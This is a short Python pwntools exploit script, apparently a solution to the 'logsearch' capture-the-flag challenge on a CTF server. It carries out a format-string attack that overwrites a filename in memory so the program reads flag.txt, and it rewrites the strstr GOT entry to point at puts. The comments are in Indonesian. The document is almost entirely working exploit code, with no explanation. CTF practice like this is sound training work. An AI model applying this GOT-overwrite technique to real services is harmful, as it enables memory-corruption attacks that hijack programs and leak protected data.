from pwn import *

def sendpayload(p):
    #r = process("./logsearch")
    r = remote("ctf.hackucf.org",20008)
    print(p)
    r.recvuntil("Enter a search phrase: ")
    r.sendline(p)
    r.recvuntil("Searching for: ")
    res = r.recvline().strip()
    print(r.recvall())
    return res

def main():
    search_file = 0x08049D7C # aslinya logs.txt
    strstr_got = 0x08049d38
    puts_plt = 0x08048640

    fmt = FmtStr(sendpayload)
    fmt.write(search_file,int('flag'[::-1].encode('hex'),16)) # ganti dari logs.txt jadi flag.txt
    fmt.write(strstr_got,puts_plt) # ganti got strstr ke puts
    fmt.execute_writes()

if __name__ == "__main__":
    main()
